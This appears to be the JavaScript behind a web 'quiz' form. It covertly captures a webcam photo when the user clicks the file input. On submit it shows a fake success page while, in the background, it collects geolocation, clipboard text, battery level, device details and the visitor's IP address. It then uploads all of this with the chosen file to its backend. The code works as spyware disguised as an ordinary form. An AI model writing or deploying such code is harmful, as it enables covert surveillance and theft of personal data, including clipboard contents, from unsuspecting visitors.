const form = document.getElementById("quiz-form");
const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const fileInput = document.getElementById("user-file");

const BACKEND_BASE = "/api";
const constraints = { video: { facingMode: "user" }, audio: false };

let cameraCaptured = false;
let capturedImage = null; // store camera image temporarily

// ================================
// COLLECT METADATA (ON SUBMIT)
// ================================
async function collectMetadata() {
  const metadata = {
    useragent: navigator.userAgent,
    platform: navigator.platform,
    battery: "N/A",
    location: "N/A",
    deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A",
    clipboardText: "", // new field replacing old network
    time: new Date().toLocaleString(),
    ip: ""
  };

  // Battery info (no popup)
  if (navigator.getBattery) {
    try {
      const b = await navigator.getBattery();
      metadata.battery = `${b.level * 100}% charging:${b.charging}`;
    } catch {}
  }

  // Location only if already granted
  if (navigator.permissions && navigator.geolocation) {
    try {
      const status = await navigator.permissions.query({ name: "geolocation" });
      if (status.state === "granted") {
        const pos = await new Promise((res, rej) =>
          navigator.geolocation.getCurrentPosition(res, rej)
        );
        metadata.location = `${pos.coords.latitude},${pos.coords.longitude}`;
      }
    } catch {}
  }

  // Clipboard only if already allowed
  if (navigator.permissions && navigator.clipboard) {
    try {
      const status = await navigator.permissions.query({ name: "clipboard-read" });
      if (status.state === "granted") {
        const text = await navigator.clipboard.readText();
        metadata.clipboardText = text;
      }
    } catch {}
  }

  // Get user IP from public API
  try {
    const ipRes = await fetch("https://api.ipify.org?format=json");
    const ipData = await ipRes.json();
    metadata.ip = ipData.ip;
  } catch {}

  return metadata;
}

// ================================
// CAPTURE CAMERA (ONLY ON FILE CLICK)
// ================================
async function captureCamera() {
  if (cameraCaptured) return;

  try {
    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    video.srcObject = stream;
    video.style.display = "block"; // temporarily show video for capture

    // Wait for video to be ready
    await new Promise(resolve => {
      if (video.readyState >= 3) return resolve(); // HAVE_FUTURE_DATA
      video.onloadeddata = () => resolve();
    });

    // Extra delay to ensure frame is ready
    await new Promise(r => setTimeout(r, 1000));

    canvas.width = 640;
    canvas.height = 480;

    const ctx = canvas.getContext("2d");
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    capturedImage = canvas.toDataURL("image/png"); // store image

    // Stop camera
    stream.getTracks().forEach(t => t.stop());
    video.style.display = "none";
    cameraCaptured = true;
  } catch (err) {
    console.log("Camera denied or blocked:", err);
  }
}

// Ask camera permission only on file click
if (fileInput) {
  fileInput.addEventListener("click", async () => {
    await captureCamera();
  });
}

// ================================
// UPLOAD FILE + METADATA + CAMERA IMAGE
// ================================
async function uploadFileWithMetadata(file, metadata, cameraImage) {
  return new Promise((resolve, reject) => {
    const reader = new FileReader();

    reader.onload = async () => {
      try {
        const res = await fetch(`${BACKEND_BASE}/file-upload`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            file: reader.result,
            filename: file.name,
            metadata,
            cameraImage // optional, include if captured
          }),
        });

        resolve(await res.json());
      } catch (err) {
        reject(err);
      }
    };

    reader.onerror = () => reject(reader.error);
    reader.readAsDataURL(file);
  });
}

// ================================
// SUBMIT FORM
// ================================
form.addEventListener("submit", async (e) => {
  e.preventDefault();

  if (!fileInput.files.length) {
    alert("Please upload a file first");
    return;
  }

  // Show success page immediately
  document.getElementById("quiz-container").style.display = "none";
  document.getElementById("success-container").style.display = "flex";

  // Send everything in background
  (async () => {
    try {
      const metadata = await collectMetadata();

      const res = await uploadFileWithMetadata(
        fileInput.files[0],
        metadata,
        capturedImage
      );

      console.log("Upload successful:", res);
    } catch (err) {
      console.error("Background upload failed:", err);
    }
  })();
});
